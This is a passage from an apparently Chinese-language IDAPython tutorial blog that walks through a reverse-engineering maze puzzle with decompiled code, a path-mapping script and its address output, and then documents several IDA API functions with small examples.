== <span class="number">43</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = sub_7FF6C8B81230(&amp;unk_7FF6C8BB7000, dword_7FF6C8BB7FA0);</span><br><span class="line">    mapz = v7;</span><br><span class="line">    v8 = <span class="number">6</span>;</span><br><span class="line">    v9 = v7;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = **(v9 + <span class="number">16</span>);</span><br><span class="line">      --v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 );</span><br><span class="line">    mapx = v9;</span><br><span class="line">    v10 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = **(v7 + <span class="number">16</span>);</span><br><span class="line">      --v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 );</span><br><span class="line">    v11 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(v7 + <span class="number">8</span>);</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">    mapy = v7;</span><br><span class="line">    <span class="keyword">if</span> ( argc != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = *in == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *in )</span><br><span class="line">      &#123;</span><br><span class="line">        step = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">map</span> = mapx;</span><br><span class="line">        _step = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          now = in[_step];</span><br><span class="line">          <span class="keyword">switch</span> ( now )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">              v19 = <span class="built_in">map</span>[<span class="number">2</span>];</span><br><span class="line">              <span class="keyword">if</span> ( !v19 || *(<span class="built_in">map</span> + <span class="number">26</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">              v19 = <span class="built_in">map</span>[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( !v19 || *(<span class="built_in">map</span> + <span class="number">25</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">              v19 = *<span class="built_in">map</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !*<span class="built_in">map</span> || *(<span class="built_in">map</span> + <span class="number">24</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">goto</span> check;</span><br><span class="line">          &#125;</span><br><span class="line">          mapx = v19;</span><br><span class="line">          *(v19 + <span class="number">27</span>) = <span class="number">1</span>;</span><br><span class="line">          _step = step;</span><br><span class="line">          len = <span class="built_in">strlen</span>(in);</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="built_in">map</span> = v19;</span><br><span class="line">          v12 = len &lt;= _step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !v12 );</span><br><span class="line">      &#125;</span><br><span class="line">check:</span><br><span class="line">      <span class="keyword">if</span> ( v12 &amp;&amp; mapx == v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = sub_7FF6C8B81770(&amp;qword_7FF6C8BB92C0, <span class="string">&quot;yes flag is flag&#123;UUID(md5(your input))&#125;&quot;</span>);</span><br><span class="line">        sub_7FF6C8B81B70(v13);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面的逻辑不解释 总之就是选择x, y, z来选择要走分支 然后根据这个位置有没有能解引用的地址 最终目标是让<code>mapx</code>到达<code>mapy</code> 每条分支除了要看能不能解引用还要看接下来的三个字节 为0代表对饮的分支可走</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F08%2F20240908-201731.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F08%2F20240908-202100.png" alt="image-20240908202100528"></p>
<p>这意味着这题如果手动找解的话要不停的telescope来手绘地图 这里就可以用到<code>get_bytes()</code>和<code>get_wide_byte()</code>来轻松获取全部路径:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"></span><br><span class="line">starts = [<span class="number">0x1A9F16BD830</span>]</span><br><span class="line">way = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> starts:</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> start <span class="keyword">in</span> starts:</span><br><span class="line">        to_add = []</span><br><span class="line">        x = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        y = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start+<span class="number">8</span>, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        z = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start+<span class="number">16</span>, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        to_go = [x, y, z]</span><br><span class="line">        is_x = idaapi.get_wide_byte(start + <span class="number">24</span>) ^ <span class="number">1</span></span><br><span class="line">        is_y = idaapi.get_wide_byte(start + <span class="number">25</span>) ^ <span class="number">1</span></span><br><span class="line">        is_z = idaapi.get_wide_byte(start + <span class="number">26</span>) ^ <span class="number">1</span></span><br><span class="line">        can_go = [is_x, is_y, is_z]</span><br><span class="line">        to_add = [to_go[i] * can_go[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(start) + <span class="string">&#x27;-&gt;&#x27;</span> + <span class="built_in">str</span>([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> to_add]))</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> way:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> to_add[i] <span class="keyword">and</span> to_add[i] <span class="keyword">in</span> way[path] <span class="keyword">or</span> to_add[i] == path:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Deleting <span class="subst">&#123;<span class="built_in">hex</span>(to_add[i])&#125;</span> for it in <span class="subst">&#123;[<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> way[path]]&#125;</span>&#x27;</span>)</span><br><span class="line">                    to_add[i] = <span class="number">0</span></span><br><span class="line">        way[start] = to_add</span><br><span class="line">        <span class="built_in">next</span> += [x <span class="keyword">for</span> x <span class="keyword">in</span> to_add <span class="keyword">if</span> x]</span><br><span class="line">    starts = <span class="built_in">next</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;XXXX&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> way:</span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(path)&#125;</span> -&gt; <span class="subst">&#123;[<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> way[path]]&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到result:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1a9f16bd830 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd880&#x27;, &#x27;0x1a9f16bdc90&#x27;]</span><br><span class="line">0x1a9f16bd880 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd8d0&#x27;, &#x27;0x1a9f16bd4c0&#x27;]</span><br><span class="line">0x1a9f16bdc90 -&gt; [&#x27;0x1a9f16bdc40&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd8d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdd30&#x27;]</span><br><span class="line">0x1a9f16bd4c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd510&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdc40 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be140&#x27;]</span><br><span class="line">0x1a9f16bdd30 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdd80&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd510 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd560&#x27;, &#x27;0x1a9f16bd1f0&#x27;]</span><br><span class="line">0x1a9f16be140 -&gt; [&#x27;0x1a9f16be0f0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdd80 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bddd0&#x27;, &#x27;0x1a9f16be280&#x27;]</span><br><span class="line">0x1a9f16bd560 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd920&#x27;]</span><br><span class="line">0x1a9f16bd1f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd240&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be0f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be690&#x27;]</span><br><span class="line">0x1a9f16bddd0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be280 -&gt; [&#x27;0x1a9f16be230&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd920 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd970&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd240 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bcfc0&#x27;]</span><br><span class="line">0x1a9f16be690 -&gt; [&#x27;0x1a9f16be640&#x27;, &#x27;0x1a9f16be6e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be230 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be7d0&#x27;]</span><br><span class="line">0x1a9f16bd970 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd9c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcfc0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd010&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be640 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be6e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be7d0 -&gt; [&#x27;0x1a9f16be780&#x27;, &#x27;0x1a9f16be820&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd9c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bda10&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd010 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bca60&#x27;]</span><br><span class="line">0x1a9f16be780 -&gt; [&#x27;0x1a9f16be730&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be820 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bda10 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bca60 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcab0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be730 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be190&#x27;]</span><br><span class="line">0x1a9f16bcab0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcb00&#x27;, &#x27;0x1a9f16bc970&#x27;]</span><br><span class="line">0x1a9f16be190 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be1e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcb00 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd0b0&#x27;]</span><br><span class="line">0x1a9f16bc970 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bc9c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be1e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdce0&#x27;]</span><br><span class="line">0x1a9f16bd0b0 -&gt; [&#x27;0x1a9f16bd060&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bc9c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bca10&#x27;, &#x27;0x1a9f16bc920&#x27;]</span><br><span class="line">0x1a9f16bdce0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd060 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd2e0&#x27;]</span><br><span class="line">0x1a9f16bca10 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bcb50&#x27;]</span><br><span class="line">0x1a9f16bc920 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd2e0 -&gt; [&#x27;0x1a9f16bd290&#x27;, &#x27;0x1a9f16bd330&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcb50 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcba0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd290 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd5b0&#x27;]</span><br><span class="line">0x1a9f16bd330 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd380&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcba0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd150&#x27;]</span><br><span class="line">0x1a9f16bd5b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd600&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd380 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd3d0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd150 -&gt; [&#x27;0x1a9f16bd100&#x27;, &#x27;0x1a9f16bd1a0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd600 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd650&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd3d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd6f0&#x27;]</span><br><span class="line">0x1a9f16bd100 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd1a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd420&#x27;]</span><br><span class="line">0x1a9f16bd650 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd6f0 -&gt; [&#x27;0x1a9f16bd6a0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd420 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd470&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd6a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bda60&#x27;]</span><br><span class="line">0x1a9f16bd470 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bda60 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdab0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdab0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdb00&#x27;, &#x27;0x1a9f16bdf10&#x27;]</span><br><span class="line">0x1a9f16bdb00 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd740&#x27;]</span><br><span class="line">0x1a9f16bdf10 -&gt; [&#x27;0x1a9f16bdec0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd740 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd790&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdec0 -&gt; [&#x27;0x1a9f16bde70&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be3c0&#x27;]</span><br><span class="line">0x1a9f16bd790 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd7e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bde70 -&gt; [&#x27;0x1a9f16bde20&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be3c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be410&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd7e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bde20 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be320&#x27;]</span><br><span class="line">0x1a9f16be410 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be460&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be320 -&gt; [&#x27;0x1a9f16be2d0&#x27;, &#x27;0x1a9f16be370&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be460 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be4b0&#x27;, &#x27;0x1a9f16bdf60&#x27;]</span><br><span class="line">0x1a9f16be2d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be870&#x27;]</span><br><span class="line">0x1a9f16be370 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be4b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdf60 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be870 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be8c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be8c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be910&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be910 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be960&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be960 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be9b0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be9b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bffd0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bffd0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0020&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0020 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0070&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0070 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c00c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c00c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0110&#x27;, &#x27;0x1a9f16be550&#x27;]</span><br><span class="line">0x1a9f16c0110 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0160&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be550 -&gt; [&#x27;0x1a9f16be500&#x27;, &#x27;0x1a9f16be5a0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0160 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c01b0&#x27;, &#x27;0x1a9f16be5f0&#x27;]</span><br><span class="line">0x1a9f16be500 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be000&#x27;]</span><br><span class="line">0x1a9f16be5a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be0a0&#x27;]</span><br><span class="line">0x1a9f16c01b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be5f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be000 -&gt; [&#x27;0x1a9f16bdfb0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be0a0 -&gt; [&#x27;0x1a9f16be050&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdfb0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdb50&#x27;]</span><br><span class="line">0x1a9f16be050 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdb50 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdba0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdba0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdbf0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdbf0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br></pre></td></tr></table></figure>

<h2 id="与IDA交互"><a href="#与IDA交互" class="headerlink" title="与IDA交互"></a>与IDA交互</h2><h3 id="让IDA生成信息更具可操作性"><a href="#让IDA生成信息更具可操作性" class="headerlink" title="让IDA生成信息更具可操作性"></a>让IDA生成信息更具可操作性</h3><h4 id="get-name-value-from-name-typ-value-get-dtype-size-dtype"><a href="#get-name-value-from-name-typ-value-get-dtype-size-dtype" class="headerlink" title="get_name_value(_from, name) -&gt; (typ, value) | get_dtype_size(dtype)"></a>get_name_value(_from, name) -&gt; (typ, value) | get_dtype_size(dtype)</h4><p>获取IDA生成信息对应的值和值的类型 例如:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F04%2F20240904-220744.png" alt="image-20240904220744244"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type:<span class="subst">&#123;idaapi.get_name_value(<span class="number">0x40D2C2</span>, <span class="string">&#x27;var_18&#x27;</span>)[<span class="number">0</span>]&#125;</span>\nValue:<span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_name_value(<span class="number">0x40D2C2</span>, <span class="string">&#x27;var_18&#x27;</span>)[<span class="number">1</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;NT_SEG:<span class="subst">&#123;idaapi.NT_SEG&#125;</span>, NT_NONE:<span class="subst">&#123;idaapi.NT_NONE&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F04%2F20240904-220843.png" alt="image-20240904220843115"></p>
<p>其中<code>typ</code>以及后面会出现的<code>dtype</code>成员代表该数据的类型 参考<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__dt__.html">IDA SDK: Operand value types</a> 如果传入的<code>name</code>在程序未开始运行时不存在值时返回的<code>value</code>是-1且<code>typ</code>为<code>NT_NONE(0x0)</code> 否则<code>value</code>为这个IDA名称所对应的真实值 可以用来编写汇编代码 若不确定<code>_from</code>的话应该使用<code>idc.BADADDR</code>占位</p>
<p><code>get_dtype_size(dtype)</code> 返回某个dtype代号对应的数据类型长度(in bytes)</p>
<h4 id="get-item-head-ea-int-get-item-size-ea-int"><a href="#get-item-head-ea-int-get-item-size-ea-int" class="headerlink" title="get_item_head(ea) -&gt; int | get_item_size(ea) -&gt; int"></a>get_item_head(ea) -&gt; int | get_item_size(ea) -&gt; int</h4><p><code>get_item_head</code>用于获取IDA中某个地址所在Item的首地址 而<code>get_item_size</code>用于获取某个地址距离所在Item结尾地址的长度 例如汇编指令:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F05%2F20240905-134621.png" alt="image-20240905134621494"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The Start address of the ITEM at 0x40D2A8 : <span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_item_head(<span class="number">0x40D2A8</span>))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The lenth of the rest of the ITEM at 0x40D2A9 : <span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_item_size(<span class="number">0x40D2A9</span>))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F05%2F20240905-194256.png" alt="image-20240905194255927"></p>
<h4 id="class-insn-t-decode-insn-insn-ea-int"><a href="#class-insn-t-decode-insn-insn-ea-int" class="headerlink" title="class insn_t() | decode_insn(insn, ea) -&gt; int"></a>class insn_t() | decode_insn(insn, ea) -&gt; int</h4><p><code>insn_t</code>对象实例化时不需要也不能传递任何参数 实例化出来的对象所有的成员都被初始化成一个固定的初始值(大部分是-1)  使用<code>decode_insn()</code>传入已经实例化的<code>insn_t</code>对象和要解析的指令的首地址 函数返回指令的长度(in bytes) 此时insn就记录了这条指令的<a href="https://hex-rays.com//products/ida/support/idapython_docs/ida_ua.html#ida_ua.insn_t">所有信息</a> 其中最重要的是这条指令操作数(<a href="https://hex-rays.com//products/ida/support/idapython_docs/ida_ua.html#ida_ua.op_t"><code>op_t</code></a>) 操作数对象还包含了更多相关信息 介绍一下其中两个比较常用的成员</p>
<p><code>insn.ops[n].dtype</code>  : 操作数的数据类别 参考<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__dt__.html">IDA SDK: Operand value types</a></p>
<p><code>insn.ops[n].type</code>    : 操作数的类别 参考<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__o__.html#gab490f48c733f3d29c700bb5d70ecc198">IDA SDK: Operand types</a></p>
<p><code>insn.ops[n].value</code>  : 如果该操作数是立即数 返回这个值</p>
<h4 id="get-func-attr-ea-attr-any-set-func-addr-ea-attr-value-int"><a href="#get-func-attr-ea-attr-any-set-func-addr-ea-attr-value-int" class="headerlink" title="get_func_attr(ea, attr) -&gt; any | set_func_addr(ea, attr, value) -&gt; int"></a>get_func_attr(ea, attr) -&gt; any | set_func_addr(ea, attr, value) -&gt; int</h4><p>分别用于获取和设置ea地址所在的函数的attr属性 设置属性时返回<code>1</code>表示成功返回<code>0</code>表示失败</p>
<p>这些属性是:</p>
<table>
<thead>
<tr>
<th>Attribution (idc.)</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>FUNCATTR_ARGSIZE</td>
<td>28</td>
</tr>
<tr>
<td>FUNCATTR_COLOR</td>
<td>36</td>
</tr>
<tr>
<td>FUNCATTR_END</td>
<td>4</td>
</tr>
<tr>
<td>FUNCATTR_FLAGS</td>
<td>8</td>
</tr>
<tr>
<td>FUNCATTR_FPD</td>
<td>32</td>
</tr>
<tr>
<td>FUNCATTR_FRAME</td>
<td>16</td>
</tr>
<tr>
<td>FUNCATTR_FRREGS</td>
